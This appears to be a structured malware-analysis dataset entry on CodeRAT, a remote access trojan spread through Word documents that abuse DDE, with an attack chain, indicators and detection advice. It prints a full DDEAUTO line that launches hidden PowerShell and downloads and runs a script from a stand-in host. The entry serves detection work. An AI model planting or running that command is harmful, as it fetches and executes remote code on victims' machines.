package_info.package_versions: N/A (source code release, not a package manager version)
package_info.why_malicious: CodeRAT is a Remote Access Trojan (RAT) that provides attackers with persistent, unauthorized remote control over infected systems. It is distributed via a malicious Microsoft Word document exploiting the Dynamic Data Exchange (DDE) feature, specifically targeting Farsi-speaking software developers. The malware enables remote command execution, data exfiltration, and system manipulation, which are all core malicious activities. Its delivery method, stealth, and post-infection capabilities make it a significant threat.

execution_context.trigger: When the user opens the malicious Word document

malicious_snippets.code_snippet: DDEAUTO c:\windows\system32\cmd.exe "/k powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')"
malicious_snippets.code_behavior: When the user opens the document, the DDEAUTO field triggers PowerShell with ExecutionPolicy Bypass, which downloads and executes a remote PowerShell script from an external domain, resulting in the initial infection stage.

malice_analysis.why_suspicious: Embedding a DDEAUTO field in a Word document to launch PowerShell and download code from the internet is a well-documented malware delivery technique, often used to bypass macro security controls.
malice_analysis.violated_expectations: Legitimate Word documents should not execute system-level commands or initiate network connections to download and run remote code.
malice_analysis.similar_legitimate_use: DDE is intended for inter-application data exchange (e.g., updating Excel data in Word), but not for launching arbitrary system commands or scripts.
key_indicators: Presence of DDEAUTO field in document
PowerShell launched with ExecutionPolicy Bypass and NoProfile
DownloadString method used to fetch remote script

execution_context.trigger: After the PowerShell script is executed by the DDE field

malicious_snippets.code_behavior: After the PowerShell script is executed, it downloads the CodeRAT executable from a remote server to the public user directory and immediately launches it, enabling the next stage of the attack.

malice_analysis.why_suspicious: The script downloads an executable from an untrusted remote server and runs it without user consent, a classic malware installation pattern.
malice_analysis.violated_expectations: Legitimate scripts should not fetch and execute binaries from the internet, especially without user interaction or from untrusted sources.
malice_analysis.similar_legitimate_use: Software updaters may download and run new versions, but only from trusted, verified sources and typically with user awareness.
key_indicators: Immediate execution of newly downloaded binary
No user prompt or validation before execution

execution_context.trigger: After CodeRAT.exe is launched and running on the victim system
execution_context.file_location: CodeRAT.exe (main RAT binary, typically in C:\Users\Public\)

malicious_snippets.code_language: C# (or similar, as per typical RAT implementation)
malicious_snippets.code_behavior: After CodeRAT.exe is running, the malware continuously polls the attacker's command and control server for instructions, collects and exfiltrates sensitive data, and executes arbitrary system commands as directed, providing persistent remote access to the attacker.

malice_analysis.why_suspicious: The binary implements a command-and-control loop, enabling remote command execution and data exfiltration, which are defining characteristics of RAT malware.
malice_analysis.violated_expectations: Normal software should not accept and execute remote commands from untrusted sources or transmit user data to external servers without explicit consent.
malice_analysis.similar_legitimate_use: Enterprise remote administration tools may have similar capabilities, but are deployed with user knowledge, authentication, and strict access controls.
key_indicators: Polling external C2 server for commands
Execution of arbitrary system commands received remotely

attack_chain.action: User opens a malicious Word document, which triggers the DDEAUTO field to launch PowerShell.
attack_chain.leads_to: Download and execution of the initial PowerShell payload

attack_chain.action: The PowerShell script downloads and executes the CodeRAT binary from a remote server.
attack_chain.leads_to: Installation and execution of the CodeRAT RAT on the victim system

attack_chain.action: CodeRAT establishes communication with the attacker's server, exfiltrates data, and executes remote commands.
attack_chain.leads_to: Attacker gains persistent remote access, data exfiltration, and system control

behavioral_signatures: Office documents containing DDEAUTO fields that launch PowerShell processes
PowerShell scripts that download and execute binaries from untrusted or non-corporate domains
New executables appearing in public or temporary user directories (e.g., C:\Users\Public\CodeRAT.exe)
Processes that establish persistent polling to external command and control servers
Unusual outbound data transfers to remote servers following execution of new binaries
file_indicators: Word documents with embedded DDEAUTO fields
Downloaded executables named CodeRAT.exe in C:\Users\Public\ or similar directories
Suspicious PowerShell scripts (e.g., payload.ps1) downloaded from external domains
network_indicators: HTTP/HTTPS connections to attacker-controlled domains such as malicious-domain.com
Frequent outbound requests to unknown or suspicious C2 infrastructure
Data exfiltration traffic to non-corporate, untrusted IP addresses or domains
detection_knowledge.how_to_detect: Monitor for Office documents containing DDEAUTO fields that launch PowerShell, detect PowerShell processes that download and execute remote binaries, flag unknown executables appearing in public directories, and alert on outbound connections to known malicious domains or C2 infrastructure. Correlate these behaviors across endpoints and network traffic to identify the full attack chain and block further execution.
